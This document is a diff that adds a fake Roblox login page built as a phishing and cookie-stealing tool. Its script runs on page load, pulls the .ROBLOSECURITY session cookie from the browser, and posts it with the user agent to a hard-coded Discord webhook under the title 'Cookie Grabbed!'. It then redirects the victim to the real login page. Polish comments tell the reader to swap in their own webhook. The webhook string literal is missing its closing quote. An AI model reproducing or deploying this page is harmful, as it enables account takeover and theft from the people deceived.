@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Roblox - Log in</title>
+  <meta charset="UTF-8">
+  <style>
+    body {font-family: 'Roboto', sans-serif; background: linear-gradient(135deg, #1a1a1a, #2d2d2d); color: white; text-align: center; margin: 0; padding: 50px;}
+    .container {max-width: 400px; margin: auto; background: #333; padding: 30px; border-radius: 15px; box-shadow: 0 0 20px rgba(0,0,0,0.5);}
+    input {width: 100%; padding: 12px; margin: 10px 0; border: none; border-radius: 8px; font-size: 16px;}
+    button {width: 100%; padding: 14px; background: #00b300; color: white; border: none; border-radius: 8px; font-size: 18px; cursor: pointer;}
+    button:hover {background: #009900;}
+    .logo {width: 100px; margin-bottom: 20px;}
+  </style>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@500&display=swap" rel="stylesheet">
+</head>
+<body>
+  <div class="container">
+    <img src="https://www.roblox.com/img/logo.png" class="logo">
+    <h2>Log in to continue</h2>
+    <input type="text" placeholder="Username or Email" autocomplete="off">
+    <input type="password" placeholder="Password" autocomplete="off">
+    <button onclick="grab()">Log In</button>
+  </div>
+
+  <script>
+    // ← ZAMIEŃ NA SWÓJ WEBHOOK
+    const webhook = "https://discord.com/api/webhooks/1439629031791136801/z03hPcN74qLnWmOyvscOcujjXfefAnh63KwSxWJy5k6c8YrWjrhpwvAxb90GuvB4Kg-R;
+
+    function grab() {
+      const cookies = document.cookie;
+      const roblox = cookies.match(/\.ROBLOSECURITY=([^;]*)/);
+
+      if (roblox) {
+        fetch(webhook, {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({
+            embeds: [{
+              title: "Roblox Cookie Grabbed!",
+              color: 3066993,
+              fields: [
+                { name: "Cookie", value: "```" + roblox[1].substring(0, 100) + "...```", inline: false },
+                { name: "User Agent", value: "```" + navigator.userAgent + "```", inline: false },
+                { name: "IP", value: "```Grabbing...```", inline: false }
+              ],
+              thumbnail: { url: "https://www.roblox.com/headshot-thumbnail/image?userId=1&width=420&height=420&format=png" },
+              footer: { text: "Link Grabber v1" }
+            }]
+          })
+        });
+
+        // Opcjonalnie: przekieruj na prawdziwy Roblox
+        setTimeout(() => { window.location = "https://www.roblox.com/login"; }, 500);
+      }
+    }
+
+    // Auto-grab po załadowaniu
+    window.onload = grab;
+  </script>
+</body>
+</html>
